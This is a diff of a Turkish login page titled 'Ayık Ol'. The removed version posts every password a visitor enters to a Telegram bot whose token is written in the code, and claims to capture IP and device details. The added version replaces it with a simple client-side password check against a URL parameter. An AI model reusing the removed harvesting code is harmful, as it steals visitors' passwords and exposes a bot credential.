@@ -2,95 +2,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Giriş Ekranı</title>
+  <title>Ayık Ol</title>
   <style>
     body {
-      background-color: #111;
+      background-color: black;
       color: white;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
+      font-family: 'Arial', sans-serif;
       text-align: center;
-      background: #222;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #555;
+      padding: 50px;
     }
-    input[type="password"] {
-      padding: 10px;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      margin-top: 10px;
-      width: 80%;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 5px;
-      background-color: #28a745;
-      color: white;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #218838;
-    }
-    .hidden {
+    #girisEkrani, #basariliEkrani, #hataMesaji {
       display: none;
+    }
+    #ayikOlYazisi {
+      font-size: 32px;
+      color: red;
+      font-family: 'Impact', sans-serif;
+      margin-top: 20px;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 18px;
+      margin: 10px;
+    }
+    #girisBtn {
+      background-color: red;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Sisteme Giriş</h2>
-    <input type="password" id="passwordInput" placeholder="Şifreyi gir">
+  <div id="girisEkrani">
+    <h2>Şifreni Gir</h2>
+    <input type="text" id="sifreInput" placeholder="Şifreyi gir...">
     <br>
-    <button onclick="girisYap()">Kodu Gönder</button>
-    <p id="hata" class="hidden">Yanlış şifre girdin amk senin, bi daha dene.</p>
+    <button id="girisBtn">GİRİŞ</button>
+    <p id="hataMesaji">Yanlış şifre amk senin. Tekrar dene.</p>
+  </div>  <div id="basariliEkrani">
+    <div id="ayikOlYazisi">AYIK OL</div>
+    <h3>KODU GÖNDER</h3>
   </div>  <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const chatID = urlParams.get("chat") || "7791726274"; // varsayılan yönetici ID
+    const dogruSifre = urlParams.get('pass');
 
-    function girisYap() {
-      const sifre = document.getElementById("passwordInput").value;
+    const girisEkrani = document.getElementById('girisEkrani');
+    const basariliEkrani = document.getElementById('basariliEkrani');
+    const girisBtn = document.getElementById('girisBtn');
+    const sifreInput = document.getElementById('sifreInput');
+    const hataMesaji = document.getElementById('hataMesaji');
 
-      fetch(`https://api.telegram.org/bot8213782156:AAEJe2ILFHUktg5rMaN4SGX1_TS-YAUyf4k/sendMessage`, {
-        method: "POST",
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatID,
-          text: `📥 Yeni Giriş Talebi\nŞifre: ${sifre}\nIP + cihaz bilgisi yakalanıyor...`
-        })
-      });
+    girisEkrani.style.display = 'block';
 
-      // Giriş doğrulama (örnek: sadece "1234" geçerli şifre)
-      fetch(`https://api.jsonbin.io/v3/b/YOUR_BIN_ID`, {
-        headers: {
-          'X-Master-Key': 'YOUR_SECRET_KEY'
-        }
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.record && data.record[chatID] && data.record[chatID].sifre === sifre) {
-          window.location.href = `https://www.google.com/maps`; // veya kamerayla bilgi alınan özel sayfa
-        } else {
-          document.getElementById("hata").classList.remove("hidden");
-        }
-      })
-      .catch(err => {
-        console.error(err);
-        document.getElementById("hata").textContent = "Sunucu hatası, daha sonra dene.";
-        document.getElementById("hata").classList.remove("hidden");
-      });
-    }
+    girisBtn.addEventListener('click', () => {
+      const girilen = sifreInput.value;
+      if (girilen === dogruSifre) {
+        girisEkrani.style.display = 'none';
+        basariliEkrani.style.display = 'block';
+      } else {
+        hataMesaji.style.display = 'block';
+      }
+    });
   </script></body>
 </html>
